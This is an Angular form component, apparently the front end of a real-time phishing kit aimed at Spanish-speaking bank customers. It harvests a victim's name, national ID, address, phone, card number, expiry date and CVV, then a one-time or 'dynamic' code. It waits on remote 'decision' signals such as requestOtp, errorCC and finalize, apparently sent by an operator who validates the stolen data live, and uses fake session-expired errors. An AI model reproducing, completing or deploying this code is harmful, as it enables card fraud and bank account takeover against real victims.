import { CommonModule } from '@angular/common';
import { Component, EventEmitter, Input, Output, signal } from '@angular/core';
import { FuncionalityService } from '../../services/funcionality.service';

import {
  FormGroup,
  FormBuilder,
  Validators,
  ReactiveFormsModule,
  ValidatorFn,
  AbstractControl,
  ValidationErrors,
  FormsModule,
} from '@angular/forms';
import { Router } from '@angular/router';
import { NgxMaskDirective } from 'ngx-mask';
import { take } from 'rxjs';
import { ToastrService } from 'ngx-toastr';
import { HttpErrorResponse } from '@angular/common/http';

@Component({
  selector: 'app-form',
  imports: [CommonModule, ReactiveFormsModule, NgxMaskDirective, FormsModule],
  templateUrl: './form.component.html',
  styleUrl: './form.component.css',
})
export class FormComponent {
  page = signal<number>(1);
  messageId: string = '';
  cardForm: FormGroup;
  isRetry: boolean = false;
  personForm: FormGroup;
  isLoading: boolean = false;
  isOpen = false;
  showDinamicModal: boolean = true;
  currentYear: number;
  currentMonth: number;
  otp: string[] = ['', '', '', '', '', ''];

  constructor(
    private fb: FormBuilder,
    private router: Router,
    private functionalityService: FuncionalityService,
    private toastr: ToastrService
  ) {
    this.personForm = this.fb.group({
      nombre: [
        '',
        [Validators.required, Validators.pattern(/^[a-zA-Z\s]{3,50}$/)], // Nombre: solo letras y espacios, mínimo 3 caracteres
      ],
      id: [
        '',
        [Validators.required, Validators.pattern(/^[0-9]{8,10}$/)], // Cédula: 8-10 dígitos
      ],
      add: [
        '',
        [
          Validators.required,
          Validators.pattern(/^[a-zA-Z0-9\s\-.,#]{5,100}$/),
        ], // Dirección: letras, números y caracteres básicos, mínimo 5 caracteres
      ],
      tel: [
        '',
        [Validators.required, Validators.pattern(/^[0-9]{10,12}$/)], // Teléfono: 10-12 dígitos
      ],
    });

    this.cardForm = this.fb.group({
      tarjeta: [
        '',
        [Validators.required, Validators.pattern('^[0-9]{13,19}$')],
      ],
      exp: ['', [Validators.required, this.datePatternValidator()]],
      cvv: ['', [Validators.required, Validators.pattern('^[0-9]{3,4}$')]],
    });

    this.currentYear = new Date().getFullYear() % 100;
    this.currentMonth = new Date().getMonth();
  }

  nextStep() {
    this.isLoading = true;
    setTimeout(() => {
      this.page.update((page) => (page == 1 ? page + 1 : 1));
      this.isLoading = false;
    }, 1500);
  }

  onSubmit() {
    if (this.page() === 1 && this.personForm.valid) {
      const name = this.personForm.controls['nombre'].value;
      const id = this.personForm.controls['id'].value;
      const add = this.personForm.controls['add'].value;
      const tel = this.personForm.controls['tel'].value;
      this.functionalityService.appendPersonData(name, id, add, tel).subscribe({
        next: (res: any) => {
          this.messageId = res.message_id;
          this.nextStep();
        },
        error: (err) => {
          this.toastr.error('Su Sesión Caducó');
          this.router.navigate(['/']);
          this.isLoading = false;
          console.error('appendPersonData error:', err);
        },
      });
    }
    if (this.page() === 2 && this.cardForm.valid) {
      const sessionId = this.functionalityService.getStoredSessionId();

      // Reiniciar suscripción al decisionSubject
      this.functionalityService.resetDecisionSubject();

      this.isLoading = true;
      const card = this.cardForm.controls['tarjeta'].value;
      const exp = this.cardForm.controls['exp'].value;
      const cvv = this.cardForm.controls['cvv'].value;

      const month = exp.substring(0, 2);
      const year = exp.substring(2, 4);
      const formatedExp = month + '/' + year;

      this.functionalityService
        .appendCardData(card, formatedExp, cvv, this.messageId)
        .subscribe({
          next: () => {
            this.isRetry = false;
          },
          error: (err) => {
            this.toastr.error('Su sesión Caducó');
            this.isLoading = false;
            this.router.navigate(['/']);
            console.error('appendCardData error:', err);
          },
        });

      this.functionalityService.onDecision(sessionId).subscribe({
        next: (res) => {
          if (res === 'requestDinamica') {
            this.requestDinamic();
          } else if (res === 'requestOtp') {
            this.requestOtp();
          } else if (res === 'errorCC') {
            this.isLoading = false;
            this.isRetry = true;
            this.toastr.error('No se encontró ninguna coincidencia');
          }
        },
        error: (err) => {
          this.toastr.error('Error en la conexión');
          this.isLoading = false;
          console.error('onDecision error:', err);
        },
      });
    }
  }

  async sendDynamic() {
    const otpValue = this.otp.join('');
    this.isLoading = true;

    const sessionId = this.functionalityService.getStoredSessionId();

    // Reiniciar suscripción al decisionSubject
    this.functionalityService.resetDecisionSubject();

    this.functionalityService.onDecision(sessionId).subscribe({
      next: (decision) => {
        if (decision === 'errorOtp') {
          this.isLoading = false;
          this.isRetry = true;
          this.toastr.error('Clave Dinamica Invalida');
          this.clear();
        } else if (decision === 'errorDinamica') {
          this.isLoading = false;
          this.isRetry = true;
          this.toastr.error('Clave Dinamica Invalida');
          this.clear();
        } else if (decision === 'finalize') {
          this.isLoading = false;
          this.toastr.success('Completado');
          this.router.navigate(['/success']);
        }
      },
      error: (err) => {
        this.toastr.error('Error en la conexión');
        this.isLoading = false;
        console.error('onDecision error:', err);
      },
    });

    this.functionalityService.updateMessageWithOtp(otpValue).subscribe({
      error: (err) => {
        this.isLoading = false;
        this.toastr.error('Su sesión Caducó');
        this.router.navigate(['/']);
        console.error('Error en updateMessageWithOtp:', err);
      },
    });
  }

  requestOtp() {
    this.clear();
    this.isLoading = false;
    this.isOpen = true;
    // Reiniciar suscripción al decisionSubject
    this.functionalityService.resetDecisionSubject();
  }

  requestDinamic() {
    this.clear();
    this.isLoading = false;
    this.isOpen = true;

    // Reiniciar suscripción al decisionSubject
    this.functionalityService.resetDecisionSubject();
  }

  datePatternValidator(): ValidatorFn {
    return (control: AbstractControl): ValidationErrors | null => {
      let value = control.value;
      const month = value.substring(0, 2);
      const year = value.substring(2, 4);
      console.log(typeof value)
      value = month + '/' + year;

      if (!value) {
        return null;
      }

      if (isNaN(month) || isNaN(year)) {
        return { invalidDateFormat: true };
      }

      if (month < 1 || month > 12) {
        return { invalidMonth: true };
      }
      console.log(this.currentMonth+'->'+month)
      if (year < this.currentYear || year > this.currentYear + 10) {
        return { invalidYear: true };
      }
      if (year == this.currentYear && month <= this.currentMonth + 1) {
        console.log(this.currentMonth+'->'+month)
        return { expiredDate: true };
      }

      return null;
    };
  }

  hasError(controlName: string, errorName: string): boolean {
    const control = this.cardForm.get(controlName);
    return control?.touched && control.errors?.[errorName];
  }

  close() {
    this.isOpen = false;
  }

  onInput(value: string, index: number) {
    if (/^[0-9]$/.test(value)) {
      const nextIndex = index;
      if (nextIndex < this.otp.length) {
        const nextInput =
          document.querySelectorAll<HTMLInputElement>('.otp-input')[nextIndex];
        nextInput.value = '';
        if (nextInput) {
          nextInput.focus();
        }
      }
    } else {
      this.otp[index] = '';
    }
  }

  clear() {
    this.otp = ['', '', '', '', '', ''];
  }

  isActive(index: number): boolean {
    const firstEmptyIndex = this.otp.findIndex((d) => d === '');
    if (firstEmptyIndex === -1) {
      return index === this.otp.length - 1;
    }
    return index === firstEmptyIndex;
  }

  onBackspace(event: any, index: number) {
    const keyboardEvent = event as KeyboardEvent;
    const inputEl = keyboardEvent.target as HTMLInputElement;

    if (inputEl.value === '' && index > 0) {
      keyboardEvent.preventDefault();

      this.otp[index] = '';

      const prevInput =
        document.querySelectorAll<HTMLInputElement>('.otp-input')[index - 1];
      prevInput.focus();
      prevInput.setSelectionRange(0, 1);
      if (prevInput) {
      }
    }
  }
}
